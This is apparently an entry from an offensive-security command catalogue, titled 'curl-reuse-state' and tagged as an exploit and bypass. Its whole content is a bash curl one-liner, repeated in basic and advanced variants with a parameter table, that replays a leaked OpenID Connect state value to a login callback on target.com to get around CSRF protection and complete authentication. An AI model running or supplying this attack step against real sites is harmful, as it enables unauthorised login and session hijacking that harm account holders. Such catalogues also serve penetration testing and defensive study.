---
id: cmd-003
name: curl-reuse-state
type: command
executor: bash
data: >-
  STATE=$(cat leaked_state.txt); curl -b cookies.txt -X POST
  "https://target.com/index.php/login?openIdConnect=callback" -d
  "state=$STATE&code=some_code" -H "Content-Type:
  application/x-www-form-urlencoded"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.564Z'
platforms:
  - Linux
  - macOS
  - Web
tags:
  - exploit
  - web
  - bypass
verified: false
validated: true
submitted: true
---

# curl-reuse-state

## Command

```bash
STATE=$(cat leaked_state.txt); curl -b cookies.txt -X POST "https://target.com/index.php/login?openIdConnect=callback" -d "state=$STATE&code=some_code" -H "Content-Type: application/x-www-form-urlencoded"
```

## Description

Resubmits the OIDC callback using the leaked state to bypass CSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `STATE=$(cat leaked_state.txt)` | Load leaked state | Yes |
| `-b cookies.txt` | Load cookies | Yes |
| `-X POST` | HTTP method | Yes |
| `-d` | Form data with valid state | Yes |
| `-H` | Content type header | Yes |

## Examples

### Basic Usage

```bash
STATE=$(cat leaked_state.txt); curl -b cookies.txt -X POST "https://target.com/index.php/login?openIdConnect=callback" -d "state=$STATE&code=some_code" -H "Content-Type: application/x-www-form-urlencoded"
```

### Advanced Usage

```bash
STATE=actual_leaked_value; curl -b cookies.txt -X POST -v "https://target.com/index.php/login?openIdConnect=callback" -d "state=$STATE&code=some_code" -H "Content-Type: application/x-www-form-urlencoded"
```

## Expected Output

Successful response or redirect indicating authentication completion.

## Related

- [[Related Procedure]]
